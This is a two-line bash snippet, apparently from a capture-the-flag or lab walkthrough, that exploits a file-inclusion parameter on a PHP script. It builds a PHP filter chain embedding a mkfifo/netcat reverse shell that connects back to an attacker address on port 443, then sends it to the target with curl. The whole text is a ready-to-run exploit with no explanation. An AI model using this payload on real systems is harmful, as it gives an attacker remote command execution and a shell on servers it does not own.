```bash
python3 php_filter_chain_generator.py --chain '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.136.212 443 >/tmp/f"); ?>' | grep '^php' > payload.txt
curl -s "http://10.201.71.110/secret-script.php?file=$(cat payload.txt)"
```
